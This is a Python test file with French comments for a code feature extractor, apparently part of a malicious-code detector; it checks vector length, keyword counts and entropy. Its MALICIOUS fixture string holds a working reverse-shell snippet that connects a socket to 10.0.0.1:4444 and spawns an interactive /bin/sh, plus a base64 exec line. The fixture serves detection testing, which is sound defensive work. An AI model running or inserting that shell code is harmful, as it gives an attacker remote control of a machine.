"""
Tests de l'extraction de features (core/features.py).

Ces tests ne dépendent PAS de scikit-learn : ils valident uniquement la
transformation texte -> vecteur numérique.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.features import FEATURE_NAMES, extract_features, shannon_entropy

BENIGN = "def addition(a, b):\n    return a + b\n\nprint(addition(2, 3))\n"

MALICIOUS = (
    "import socket, subprocess, os\n"
    "s = socket.socket()\n"
    's.connect(("10.0.0.1", 4444))\n'
    "os.dup2(s.fileno(), 0)\n"
    'subprocess.call(["/bin/sh", "-i"])\n'
    "exec(base64.b64decode('ZXZpbA=='))\n"
)


def test_vector_length_matches_names() -> None:
    vec = extract_features(BENIGN)
    assert len(vec) == len(FEATURE_NAMES)
    assert all(isinstance(x, float) for x in vec)


def test_empty_text_is_safe() -> None:
    vec = extract_features("")
    assert len(vec) == len(FEATURE_NAMES)


def test_malicious_has_more_suspicious_keywords() -> None:
    idx = FEATURE_NAMES.index("suspicious_keyword_count")
    assert extract_features(MALICIOUS)[idx] > extract_features(BENIGN)[idx]


def test_shannon_entropy_bounds() -> None:
    assert shannon_entropy("") == 0.0
    assert shannon_entropy("aaaa") == 0.0            # un seul symbole
    # 4 symboles équiprobables -> 2 bits/caractère.
    assert abs(shannon_entropy("abcd") - 2.0) < 1e-9
